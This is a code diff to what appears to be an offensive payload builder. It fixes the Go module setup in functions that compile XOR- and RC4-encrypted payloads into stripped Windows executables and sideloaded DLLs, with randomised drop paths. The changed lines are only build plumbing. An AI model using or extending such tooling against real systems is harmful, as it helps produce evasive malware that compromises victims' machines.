@@ -1088,16 +1088,17 @@ def stage_compile_payload(raw_payload, xor_key, rc4_key, litterbox):
         if os.path.exists(exe_main_src):
             shutil.copy2(exe_main_src, os.path.join(tmpdir, "exe_main.go"))
 
-        log("Initializing Go module...")
-        subprocess.run(["go", "mod", "init", "payload"], cwd=tmpdir, capture_output=True)
-        subprocess.run(["go", "get", "golang.org/x/sys/windows"], cwd=tmpdir, capture_output=True)
-        subprocess.run(["go", "mod", "tidy"], cwd=tmpdir, capture_output=True)
-
         out_path = os.path.join(tmpdir, "payload.exe")
         env = os.environ.copy()
         env["GOOS"] = "windows"
         env["GOARCH"] = "amd64"
         env["CGO_ENABLED"] = "0"
+        env["GOTOOLCHAIN"] = "local"
+
+        log("Initializing Go module...")
+        subprocess.run(["go", "mod", "init", "payload"], cwd=tmpdir, capture_output=True, env=env)
+        subprocess.run(["go", "get", "golang.org/x/sys@v0.29.0"], cwd=tmpdir, capture_output=True, env=env)
+        subprocess.run(["go", "mod", "tidy"], cwd=tmpdir, capture_output=True, env=env)
 
         log("Compiling (GOOS=windows, stripped, windowsgui)...")
         build = subprocess.run(
@@ -1249,24 +1250,26 @@ def stage_compile_dll(raw_payload, xor_key, rc4_key, litterbox, dll_name=None, d
             f.write(dll_go_src)
         log(f"DLL drop path randomized: {dll_subdir}\\{dll_name}", "OK")
 
-        log("Initializing Go module...")
-        subprocess.run(["go", "mod", "init", "payload"], cwd=tmpdir, capture_output=True)
-        subprocess.run(["go", "get", "golang.org/x/sys/windows"], cwd=tmpdir, capture_output=True)
-        subprocess.run(["go", "mod", "tidy"], cwd=tmpdir, capture_output=True)
-
-        out_path = os.path.join(tmpdir, "payload.dll")
-        env = os.environ.copy()
-        env["GOOS"] = "windows"
-        env["GOARCH"] = "amd64"
-        env["CGO_ENABLED"] = "1"
-
         cc = shutil.which("x86_64-w64-mingw32-gcc")
         if not cc:
             raise Exception(
                 "x86_64-w64-mingw32-gcc not found.\n"
                 "Install MinGW-w64: apt install gcc-mingw-w64-x86-64"
             )
+
+        # Set env early — go get/mod tidy need GOOS+CGO+CC to resolve dll_sideload.go deps
+        out_path = os.path.join(tmpdir, "payload.dll")
+        env = os.environ.copy()
+        env["GOOS"] = "windows"
+        env["GOARCH"] = "amd64"
+        env["CGO_ENABLED"] = "1"
         env["CC"] = cc
+        env["GOTOOLCHAIN"] = "local"
+
+        log("Initializing Go module...")
+        subprocess.run(["go", "mod", "init", "payload"], cwd=tmpdir, capture_output=True, env=env)
+        subprocess.run(["go", "get", "golang.org/x/sys@v0.29.0"], cwd=tmpdir, capture_output=True, env=env)
+        subprocess.run(["go", "mod", "tidy"], cwd=tmpdir, capture_output=True, env=env)
 
         log("Compiling DLL (c-shared, CGO, stripped)...")
         build = subprocess.run(
